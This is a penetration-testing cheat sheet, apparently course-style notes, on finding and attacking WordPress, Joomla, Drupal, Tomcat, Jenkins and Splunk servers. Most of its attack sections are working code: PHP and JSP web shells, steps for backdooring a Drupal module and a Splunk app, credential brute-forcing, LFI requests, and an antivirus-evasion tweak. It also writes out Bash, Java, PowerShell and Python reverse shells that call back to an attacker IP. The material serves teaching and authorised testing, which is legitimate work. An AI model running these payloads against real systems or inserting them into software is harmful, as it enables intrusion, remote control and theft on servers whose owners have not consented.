---
layout: default
title: Common Application Attacks
permalink: /Web/App/
---

# Application Discovery & Enumeration

[EyeWitness](https://github.com/RedSiege/EyeWitness) and [Aquatone](https://github.com/michenriksen/aquatone) are tools to help us quickly inspect all hosts running web applications and take screenshots using raw Nmap XML scan outputs as input.

## Note Taking

We should use a note taking app. 
Some tips:
- Break down the `Enumeration & Discovery` section of the notebook into a separate `Application Discovery` section.
- In the `Application Discovery` we can create subsections for the scope, scans, app screenshotting, interesting hosts, etc.
- Time and date stamp every scan and save all output and the executed scan command.

Example note structure:
```
External Penetration Test - <Client Name>

- Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- Client Points of Contact
- Credentials
- Discovery/Enumeration
  o Scans
  o Live hosts
- Application Discovery
- Scans
- Interesting/Notable Hosts
- Exploitation
  o <Hostname or IP>
  o <Hostname or IP>
- Post-Exploitation
  o <Hostname or IP>
  o <Hostname or IP>
```

At the very least, our report should have an appendix section that lists the following information—more on this in a later module:
- Exploited systems (hostname/IP and method of exploitation)
- Compromised users (account name, method of compromise, account type (local or domain))
- Artifacts created on systems
- Changes (such as adding a local admin user or modifying group membership)

## Initial Enumeration

1. We can start with an Nmap scan of common web ports. I'll typically do an initial scan with ports 80,443,8000,8080,8180,8888,10000 and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan.
2. While reviewing the screenshot report of the most common ports, we can run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.
3. We should not rely solely on scanners. We often find the most unique and severe vulnerabilities and misconfigurations only through thorough manual testing.

*Note: We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report.*

Let's say the scope_list something like:
```
app.company.local
dev.company.local
drupal-dev.conpany.local
...
```
The initial scan:
```
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
Enumerating one of the hosts further:
```
sudo nmap --open -sV 10.129.201.50
```

## EyeWitness
Install:
```
sudo apt install eyewitness
```
Available options:
```
eyewitness -h
```
Take screenshots using Nmap XML output:
```
eyewitness --web -x web_discovery.xml -d company_eyewitness
```

## Aquatone
Install:
```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```
```
unzip aquatone_linux_amd64_1.7.0.zip
```
We can move it to a location in our $PATH such as /usr/local/bin to be able to call the tool from anywhere.

Run:
```
cat web_discovery.xml | ./aquatone -nmap
```
We can open the html report from a browser: `file:///<path_to_report.html>`.

# WordPress

## Discovery & Enumeration

- Browse to the `/robots.txt` file.
- WordPress stores its plugins in the `wp-content/plugins` directory, and themes in the `wp-content/themes` directory. These should be enumerated as they may lead to RCE.

Types of users on a standard WordPress installation:
- Administrator
- Editor
- Author
- Contributor
- Subscriber

Useful commands:
```
curl -s http://blog.company.local | grep WordPress
```
```
curl -s http://blog.company.local/ | grep themes
```
```
curl -s http://blog.company.local/ | grep plugins
```

- After identifying themes and plugins, the next step is to enumerate versions.
  E.g. if `mail-masta` plugin is installed, visit the specific site, such as `http://blog.company.local/wp-content/plugins/mail-masta/`.
- Checking the page source of a page can reveal other used plugins.
  ```
  curl -s http://blog.company.local/?p=1 | grep plugins
  ```

*Note: It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss.*

## Enumerating Users

The default WordPress login page can be found at /wp-login.php.
- A valid username and an invalid password may result in different message than an invalid username. This can bes used for username enumeration.

## WPScan
```
sudo gem install wpscan
```
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpscan.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.
```
wpscan -h
```
```
sudo wpscan --url http://blog.company.local --enumerate --api-token dEOFB<SNIP>
```
## Attacking WordPress
### Login Bruteforce
```
sudo wpscan --password-attack xmlrpc -t 20 -U ./usernames.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.company.local
```
`xmlrpc` method is preferred over `wp-login` as it's faster.

### Code Execution
If we gained admin credentials, we can try to edit a theme on the admin panel (Appearance > Theme Editor) by adding the `system($_GET[0]);` one-liner to an uncommon page, such as `404.php`. Then we can execute commands via the GET parameter `0`. WordPress themes are located at `/wp-content/themes/<theme name>`.
```
curl http://blog.company.local/wp-content/themes/twentynineteen/404.php?0=id
```
#### Metasploit
The `wp_admin_shell_upload` module from Metasploit can be used to upload a shell and execute it automatically:
```
msfconsole
```
```
use exploit/unix/webapp/wp_admin_shell_upload
```
To ensure that everything is set up properly:
```
show options
```
To set a value:
```
set RHOST <IP>
```
Once the setup is correct:
```
exploit
```
In this example, the Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins directory`. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. 

### Leveraging Known Vulnerabilities
The vast majority of the vulnerabilities can be found in plugins.
*Note: We can use the waybackurls tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.*

#### mail-pasta plugin
LFI:
```
curl -s http://blog.company.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
#### wpDiscuz plugin
Using [this exploit](https://www.exploit-db.com/exploits/49967):
```
python3 wp_discuz.py -u http://blog.company.local -p /?p=1
```
The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append `?cmd=` after the generated php webshell to run commands which we can see in the exploit script:
```
curl -s http://blog.company.local/wp-content/uploads/2021/08/zeeaygvkeodlgvt-1762181484.7355.php?cmd=id
```

# Joomla

## Discovery

```
curl -s http://dev.company.local/ | grep Joomla
```

Check the robots.txt file.

```
curl -s http://dev.company.local/README.txt | head -n 5
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.

```
curl -s http://dev.company.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.

## Enumeration
We cab try out [droopescan](https://github.com/SamJoan/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```
sudo pip3 install droopescan
```
```
droopescan -h
```
run a scan:
```
droopescan scan joomla --url http://dev.company.local/
```
We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. 
Installation of Python2.7:
```
curl https://pyenv.run | bash
```
Or if that version is already installed, we can directly use the `pyenv shell 2.7` command to use python2.7.
Then:
```
python2.7 -m pip install urllib3
```
Running a scan:
```
python2.7 joomlascan.py -u http://dev.company.local
```
## Brute-frocing
We can use [this script](https://github.com/ajnik/joomla-bruteforce):
```
sudo python3 joomla-brute.py -u http://dev.company.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

## Attacking Joomla
If we find access to the admin panel, we can check the Templates and edit one of the pages by adding a one-liner:
```
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
then we can execute code with a `curl` command:
```
curl -s http://dev.company.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
Here we edited the `error.php` page.

*Note: It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.*

*Note: If we receive an error stating "An error has occurred. Call to a member function format() on null" after logging in to the admin page, navigate to "http://dev.company.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.*

### Leveraging Known Vulnerabilities
Once we find the version, we can look for exploits in `exploit-db`.

#### Example
[CVE-2019-10945](https://www.cve.org/CVERecord?id=CVE-2019-10945) is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945).

```
python2.7 joomla_dir_trav.py --url "http://dev.company.local/administrator/" --username admin --password admin --dir /
```

# Drupal
## Discovery/Footprinting

A Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt` file, via the page source, or clues in the robots.txt file such as references to `/node`.
```
curl -s http://drupal.company.local | grep Drupal
```
In case of Drupal, the page URIs are usually of the form `/node/<nodeid>`.

Drupal supports three types of users by default:
1. Administrator
2. Authenticated User
3. Anonymous

## Enumeration
```
curl -s http://drupal-acc.company.local/CHANGELOG.txt | grep -m2 ""
```
If we get 404 response, there might be a newer version of Drupal in use which blocks access to it.

```
droopescan scan drupal -u http://drupal.company.local
```
## Attacks

### Leveraging the PHP Filter Module
In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated." We could tick the check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page. After that we can create a page with a malicious PHP snippet.
```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
We also want to make sure to set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, e.g `http://drupal-qa.company.local/node/3`.

```
curl -s http://drupal-qa.company.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.
```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Once downloaded go to `Administration` > `Reports` > `Available updates`.

*Note: Location may differ based on the Drupal version and may be under the Extend menu.*

From here, click on Browse, select the file from the directory we downloaded it to, and then click Install.

Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.

### Uploading a Backdoored Module
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
Example:
Let's pick the CAPTCHA module.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create PHP web shell:
```
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```
Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.company.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
```
curl -s drupal.company.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Drupalgeddon
This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user.
We can add a new admin user with [this PoC script](https://www.exploit-db.com/exploits/34992). Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
```
python2.7 drupalgeddon.py -t http://drupal-qa.company.local -u hacker -p pwnd
```
We could also use the `exploit/multi/http/drupal_drupageddon` Metasploit module to exploit this.

### Drupalgeddon2
We can use [this PoC](https://www.exploit-db.com/exploits/44448) to confirm this vulnerability.
```
python3 drupalgeddon2.py 
```
Then:
```
curl -s http://drupal-dev.company.local/hello.txt
```
Then we can replace the `echo` command in the exploit script with a command to write out our malicious PHP script:
```
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```
```
echo "<base64 encoded string>" | base64 -d | tee mrb3n.php
```
Then run the modifed exploit script to upload our malicious PHP file:
```
python3 drupalgeddon2.py
```
Finally RCE:
```
curl http://drupal-dev.compnay.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
### Drupalgeddon3
Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Once we have the session cookie, we can set up the exploit module as follows:
```
msfconsole
```
```
search drupal
use multi/http/drupal_drupageddon3
set rhost <IP address>
set VHOST <URI>
set drupal_session <session cookie>
set DRUPAL_NODE <number>
set LHOST <local IP address>
show options
exploit
```

# Tomcat
Apache Tomcat is an open-source web server that hosts applications written in Java.
## Discovery/Footprinting
Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. <br>
Custom error pages may be in use that do not leak this version information. In this case, another method of detecting a Tomcat server and version is through the /docs page.
```
curl -s http://app-dev.company.local:8080/docs/ | grep Tomcat
```
The general folder structure of a Tomcat installation:
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
Each folder inside webapps is expected to have the following structure:
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class
```
The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor.  This file stores information about the routes used by the application and the classes handling these routes. 
The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

## Enumeration
After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the /manager and the /host-manager pages. We can attempt to locate these with a tool such as Gobuster or just browse directly to them.
```
gobuster dir -u http://web01.company.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```
We may be able to either log in to one of these using weak credentials such as tomcat:tomcat, admin:admin, etc. If these first few tries don't work, we can try a password brute force attack against the login page. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell and obtain remote code execution on the Tomcat server.

## Attacks
If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server.
### Tomcat Manager - Login Brute Force
```
msfconsole
```
```
use auxiliary/scanner/http/tomcat_mgr_login
```
```
show options
set VHOST <uri>
set RPORT <port>
set stop_on_success true
set rhosts <IP>
```
```
run
```
Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following:
```
set PROXIES HTTP:127.0.0.1:8080
```
We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.

We can also use [this Python script](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) to achieve the same result:
```
python3 mgr_brute.py -U http://web01.company.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### Tomcat Manager - WAR File Upload
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. <br>
A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive:
```
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```
Click on `Browse` to select the .war file and then click on `Deploy`. This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table. If we click on backup, we will get redirected to `http://web01.company.local:8180/backup/` and get a 404 Not Found error. We need to specify the `cmd.jsp` file in the URL as well. Browsing to `http://web01.company.local:8180/backup/cmd.jsp`. We can also use curl:
```
curl http://web01.company.local:8180/backup/cmd.jsp?cmd=id
```
To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`. <br>

We could also use `msfvenom` to generate a malicious WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
Then `Deploy`
```
nc -lnvp 4443
```
Finally visit `http://web01.company.local:8180/backup`.
The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process. <br>
[This JSP web shell](https://github.com/SecurityRiskAdvisors/cmd.jsp) is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. 
A simple change in the code, such as changing this:
```
FileOutputStream(f);stream.write(m);o="Uploaded:
```
to this:
```
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```
Can results in 0 hits on VirusTotal.

*Note: When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.*

### CVE-2020-1938 : Ghostcat
Unauthenticated LFI in all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.
This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.
The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.
```
nmap -sV -p 8009,8080 dev.company.local
```
The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). 
```
 python2.7 CNVD-2020-10487-Tomcat-Ajp-lfi.py dev.company.local -p 8009 -f WEB-INF/web.xml
```

# Jenkins
## Discovery/Footprinting
Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers.

## Enumeration
The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. <br>
We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled.

## Attacks
Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the [Script Console](https://www.jenkins.io/doc/book/managing/script-console/). The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.
### Script Console
The script console can be reached at the URL `http://jenkins.company.local:8000/script`. This console allows a user to run Apache Groovy scripts, which are an object-oriented Java-compatible language. Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following groovy snippet to run the id command:
```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using this command:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
and setting up a listener:
```
nc -lvnp 8443
```
or [this Metasploit module](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/). <br>
Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:
```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
We could also use this Java reverse shell to gain command execution on a Windows host, swapping out localhost and the port for our IP address and listener port:
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Miscellaneous Vulnerabilities
Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://www.jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation.This exploit works against Jenkins version 2.137. <br>
Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.

# Splunk

## Discovery/Footprinting
It's possible that we find a forgotten instance of Splunk, that has since automatically converted to the free version, which does not require authentication. <br>
The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page. <br>
The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc. <br>
We can discover Splunk with a quick Nmap service scan.
```
sudo nmap -sV <ip>
```
It might identifies the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.

## Attacks
Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. 
As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. 

### Abusing Built-In Functionality
We can utilize [this Splunk package](https://github.com/0xjpuff/reverse_shell_splunk). 
First we need to create a custom Splunk application using the following directory structure:
```
tree splunk_shell/
```
output:
```
splunk_shell/
├── bin
└── default
```
The bin directory will contain any scripts that we intend to run and the default directory will have our inputs.conf file. <br>
Powershell reverse shell:
```
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
The `inputs.conf` file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present:
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner:
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```
Once the files are created, we can create a tarball or .spl file:
```
tar -cvzf updater.tar.gz splunk_shell/
```
The next step is to choose `Install app from file` and upload the application.
Before uploading the malicious custom app, let's start a listener:
```
sudo nc -lvnp 443
```
On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`. <br>
If we were dealing with a Linux host, we would need to edit the rev.py Python script before creating the tarball and uploading the custom malicious app:
```
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
